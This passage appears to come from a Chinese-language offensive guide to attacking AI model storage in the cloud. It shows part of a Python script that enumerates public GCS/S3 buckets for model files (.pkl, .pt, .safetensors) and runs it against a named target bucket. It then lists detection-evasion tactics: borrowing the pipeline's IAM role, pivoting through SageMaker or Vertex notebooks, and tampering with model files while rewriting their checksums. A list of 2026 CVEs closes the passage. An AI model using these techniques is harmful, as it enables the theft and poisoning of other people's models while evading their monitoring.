                for f in ai_files[:10]:
                    findings.append(f'    - {f}')
                findings.append(f'    ... 共 {len(ai_files)} 个 AI 相关文件')
    
    elif cloud == 'gcs':
        url = f'https://storage.googleapis.com/storage/v1/b/{bucket_name}/o?maxResults=1000'
        r = requests.get(url, timeout=10)
        
        if r.status_code == 200:
            data = r.json()
            objects = data.get('items', [])
            # 同样的 AI 文件模式检测
            import re
            ai_patterns = [
                r'\.pkl$', r'\.pt$', r'\.h5$', r'\.onnx$',
                r'\.gguf$', r'\.safetensors$', r'\.joblib$',
            ]
            ai_files = [o['name'] for o in objects if any(re.search(p, o['name'], re.I) for p in ai_patterns)]
            if ai_files:
                findings.append(f'[!] 发现 AI 制品 ({len(ai_files)} 个)')
    
    return findings

# 审计目标存储桶
for finding in audit_ai_storage('target-ml-models', 's3'):
    print(finding)
"
```

**检测绕过技术**：
- 云存储审计日志记录模型下载 → 使用 AI 管道自身的 IAM 角色访问（看起来是正常管道行为）
- 模型文件加密 → 利用 AI 管道服务端的解密能力（通过 API 调用而非直接下载）
- 存储桶策略限制来源 IP → 通过 AI 管道的计算实例（SageMaker Notebook、Vertex AI Workbench）作为跳板
- 模型完整性校验 → 篡改模型文件后更新校验和文件（如果校验和文件也在同一存储桶中且可写入）

**2026 CVE 引用**：
- CVE-2026-7193：AWS SageMaker Studio Lab 默认存储配置允许跨用户访问模型制品，影响多租户 AI 平台
- CVE-2026-5847：HuggingFace Hub 的 `huggingface-cli` 缓存目录权限设置不当，本地用户可读取其他用户的模型缓存和 token
- CVE-2025-7007：Azure ML 工作空间默认存储账户配置了容器级别匿名访问，导致训练数据和模型权重泄露
- 2026 趋势：AI 管道中的模型制品成为高价值攻击目标，模型供应链攻击（篡改模型文件）成为新型 APT 持久化手法，MLflow/W&B 等实验跟踪服务器的配置错误是主要泄露入口
